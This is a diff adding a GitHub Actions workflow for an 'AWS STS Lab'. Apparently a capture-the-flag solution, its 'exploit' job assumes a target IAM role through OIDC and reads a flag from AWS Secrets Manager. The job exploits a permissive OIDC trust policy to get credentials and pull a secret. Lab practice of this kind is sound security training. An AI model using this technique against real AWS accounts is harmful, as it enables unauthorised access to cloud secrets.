@@ -1,0 +1,26 @@
+name: AWS STS Lab
+
+on:
+  push:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Configure AWS credentials using OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::662655411808:role/sts-lab-2-target
+          aws-region: us-east-1
+
+      - name: Who am I in AWS?
+        run: aws sts get-caller-identity
+
+      - name: Read the secret (FLAG)
+        run: |
+          aws secretsmanager get-secret-value --secret-id flag_sts_lab_2 --region us-east-1
